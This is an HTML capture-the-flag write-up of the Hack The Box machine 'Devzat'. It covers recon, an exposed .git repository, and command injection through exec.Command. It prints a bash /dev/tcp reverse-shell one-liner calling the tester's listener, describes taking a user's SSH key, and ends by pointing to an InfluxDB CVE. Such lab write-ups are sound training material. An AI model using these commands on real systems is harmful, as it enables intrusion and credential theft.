@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="date" content="2022-07-26" scheme="YYYY-MM-DD">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>devzat</title>
+    <link rel="stylesheet" href="../css/main.css" type="text/css" media="screen" title="no title"
+        charset="utf-8">
+    <link rel="stylesheet" type="text/css"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/nord.min.css" />
+    <!-- <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx" crossorigin="anonymous"> -->
+
+</head>
+
+<body>
+    
+<div id="Devzat"><h1 id="Devzat" class="header"><a href="#Devzat">Devzat</a></h1></div>
+
+<div id="Devzat-Introduction"><h2 id="Introduction" class="header"><a href="#Devzat-Introduction">Introduction</a></h2></div>
+
+<div id="Devzat-Enumeration"><h2 id="Enumeration" class="header"><a href="#Devzat-Enumeration">Enumeration</a></h2></div>
+
+<div id="Devzat-Enumeration-Nmap"><h3 id="Nmap" class="header"><a href="#Devzat-Enumeration-Nmap">Nmap</a></h3></div>
+
+<p>
+From the nmap results, we can see that this is a webserver with an unidentified app on port 8000.
+Based on the scan on port 8000, it seems to be using a go library called <a href="https://github.com/karfield/ssh2go">ssh2go</a>
+</p>
+
+<pre class="nohighlight">
+Nmap scan report for devzat.htb (10.10.11.118)
+Host is up (0.022s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
+|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
+|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-title: devzat - where the devs at
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+8000/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-Go
+| ssh-hostkey: 
+|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.92%I=7%D=7/5%Time=62C472E7%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,C,"SSH-2\.0-Go\r\n");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.92%E=4%D=7/5%OT=22%CT=1%CU=34441%PV=Y%DS=2%DC=T%G=Y%TM=62C47312
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)OPS(
+OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
+OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+OS:S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT      ADDRESS
+1   21.19 ms 10.10.14.1
+2   21.28 ms devzat.htb (10.10.11.118)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</pre>
+
+<div id="Devzat-Enumeration-Website - [[http://devzat.htb]]"><h3 id="Website - [[http://devzat.htb]]" class="header"><a href="#Devzat-Enumeration-Website - [[http://devzat.htb]]">Website - <a href="http://devzat.htb">http://devzat.htb</a></a></h3></div>
+
+<p>
+Initial scanning shows the box has a website up. Trying to navigate to the website redirects us to
+<a href="http://devzat.htb">http://devzat.htb</a>. After updating our /etc/hosts, we are able to see the webpage.
+</p>
+
+<pre class="nohighlight">
+trent@TMDeal-kali[Devzat]$ cat /etc/hosts
+10.10.14.1    devzat.htb
+</pre>
+
+<p>
+<img src="../../images/devzat/website/homepage.png" alt="http://devzat.htb Homepage" />
+</p>
+
+<p>
+Not much about the site itself is interesting. However, there is a message at the bottom informing
+the reader that they are invited to try out their chat app.
+</p>
+
+<p>
+<img src="../../images/devzat/website/chat_app_start_instructions.png" alt="Chat app usage" />
+</p>
+
+<p>
+When running the instructed command, you may receive an error about no matching host key type. This
+error can be resolved by adding a few lines to ~/.ssh/config
+</p>
+
+<pre class="nohighlight">
+Host devzat.htb
+	HostName devzat.htb
+	User dev
+	PubkeyAcceptedAlgorithms +ssh-rsa
+	HostkeyAlgorithms +ssh-rsa
+</pre>
+
+<p>
+Then we can run the command to gain access to the chat app
+</p>
+
+<p>
+<img src="../../images/devzat/chat_app/initial_connection.png" alt="Initial Connection" />
+</p>
+
+<div id="Devzat-Enumeration-Chat App First Look"><h3 id="Chat App First Look" class="header"><a href="#Devzat-Enumeration-Chat App First Look">Chat App First Look</a></h3></div>
+
+<p>
+With just the basic level of access we have, there is not much that can be done with the app right
+now. We will come back to this at a later point
+</p>
+
+<div id="Devzat-Enumeration-Subdomin - [[http://pets.devzat.htb]]"><h3 id="Subdomin - [[http://pets.devzat.htb]]" class="header"><a href="#Devzat-Enumeration-Subdomin - [[http://pets.devzat.htb]]">Subdomin - <a href="http://pets.devzat.htb">http://pets.devzat.htb</a></a></h3></div>
+
+<p>
+Taking a look back at port 80, since we needed to add an entry to /etc/hosts, it may be worthwhile
+to scan for subdomains. We will scan for subdomains using Gobuster.
+</p>
+
+<p>
+<img src="../../images/devzat/website/pets/gobuster_subdomain_discovery.png" alt="Pets Subdomain Discovery" />
+</p>
+
+<p>
+Our scan finds one valid subdomain at <a href="http://pets.devzat.htb">http://pets.devzat.htb</a> The homepage is an incomplete CRUD
+app.
+</p>
+
+<p>
+<img src="../../images/devzat/website/pets/homepage.png" alt="http://pets.devzat.htb Homepage" />
+</p>
+
+<p>
+The most that can be done is adding a pet to the pet inventory, but its not hooked up to a database
+so nothing saves. Running Gobuster to find other endpoints shows that <a href="http://pets.devzat.htb/.git/">http://pets.devzat.htb/.git/</a>
+is publicly readable. We can grab the contents of the folder with
+<a href="https://pypi.org/project/git-dumper/">git-dumper</a>, but we can also just download the directory
+with a tool like wget.
+</p>
+
+<pre class="nohighlight">
+trent@TMDeal-kali[Devzat]$ git-dumper http://pets.devzat.htb/.git pets
+...
+...
+...
+trent@TMDeal-kali[Devzat]$ ls -al pets/
+total 9776
+drwxr-xr-x  5 trent trent    4096 Jul 26 17:44 .
+drwxrwxrwt 28 root  root    12288 Jul 26 17:44 ..
+drwxr-xr-x  2 trent trent    4096 Jul 26 17:44 characteristics
+drwxr-xr-x  7 trent trent    4096 Jul 26 17:44 .git
+-rw-r--r--  1 trent trent      25 Jul 26 17:44 .gitignore
+-rw-r--r--  1 trent trent      88 Jul 26 17:44 go.mod
+-rw-r--r--  1 trent trent     163 Jul 26 17:44 go.sum
+-rw-r--r--  1 trent trent    4420 Jul 26 17:44 main.go
+-rwxr-xr-x  1 trent trent 9957033 Jul 26 17:44 petshop
+-rwxr-xr-x  1 trent trent     123 Jul 26 17:44 start.sh
+drwxr-xr-x  4 trent trent    4096 Jul 26 17:44 static
+</pre>
+
+<p>
+This is probably the source code for the pets web application. Inside of main.go, there is a line
+where that takes out input without sanitizing it and passes it to <code>exec.Command</code>. This means we can
+inject our own commands into this command and gain remote code execution
+</p>
+
+<p>
+<img src="../../images/devzat/git/main_execs_sh.png" alt="Call to exec.Command" />
+</p>
+
+<div id="Devzat-Shell as Patrick"><h2 id="Shell as Patrick" class="header"><a href="#Devzat-Shell as Patrick">Shell as Patrick</a></h2></div>
+
+<p>
+To test if we can properly execute code, we will just see if we can get the contents of /etc/passwd
+</p>
+
+<p>
+<img src="../../images/devzat/git/burp_payload.png" alt="Burp Payload" />
+<img src="../../images/devzat/git/dumping_etc_passwd.png" alt="Contents of /etc/passwd" />
+</p>
+
+<p>
+Now that we now we can actually exploit this, we can execute a callback to a netcat listener.
+</p>
+
+<p>
+We base64 encrypt the command <code>bash -i &gt;&amp; /dev/tcp/10.10.14.7/4444 0&gt;&amp;1</code> and then decrypt and
+execute it in a one liner. This is done to avoid messing up the payload with special characters like
+<code>"</code> or <code>'</code>.
+</p>
+
+<p>
+<img src="../../images/devzat/git/rce_request.png" alt="Sending the request with Burp" />
+<img src="../../images/devzat/shell_as_patrick.png" alt="Shell as Patrick" />
+</p>
+
+<p>
+From there, we can grab Patrick's ssh key for a better shell experience
+</p>
+
+<p>
+<img src="../../images/devzat/shell_as_patrick_ssh.png" />
+</p>
+
+<div id="Devzat-Shell as Catherine"><h2 id="Shell as Catherine" class="header"><a href="#Devzat-Shell as Catherine">Shell as Catherine</a></h2></div>
+
+<div id="Devzat-Shell as Catherine-Interesting ports"><h3 id="Interesting ports" class="header"><a href="#Devzat-Shell as Catherine-Interesting ports">Interesting ports</a></h3></div>
+
+<p>
+After running linpeas, we can see that there are some ports that are open locally that we could not
+previously access
+</p>
+
+<p>
+<img src="../../images/devzat/linpeas/active_ports.png" />
+</p>
+
+<p>
+Right now, we do not know what these ports do, so we will look around some more.
+</p>
+
+<div id="Devzat-Shell as Catherine-Patrick Chat Log"><h3 id="Patrick Chat Log" class="header"><a href="#Devzat-Shell as Catherine-Patrick Chat Log">Patrick Chat Log</a></h3></div>
+
+<p>
+We can see Patrick's chat log in their app by logging into it while logged into the machine
+</p>
+
+<p>
+<img src="../../images/devzat/patrick_chat_log.png" />
+</p>
+
+<p>
+Looking up info on Influxdb shows that it runs on port 8086 by default. We can check the version of
+Influxdb running by making a HEAD request with curl on port 8086
+</p>
+
+<p>
+<img src="../../images/devzat/influxdb/influxdb_version.png" />
+</p>
+
+<p>
+Looking up "Influxdb 1.7.5" on google shows results for
+<a href="https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933">CVE-2019-20933</a>. 
+</p>
+
+    <script type="text/javascript"
+        src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js"></script>
+    <script type="text/javascript">
+        document.querySelectorAll('pre').forEach(block => hljs.highlightBlock(block));
+    </script>
+    <!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa" crossorigin="anonymous"></script> -->
+</body>
+
+</html>
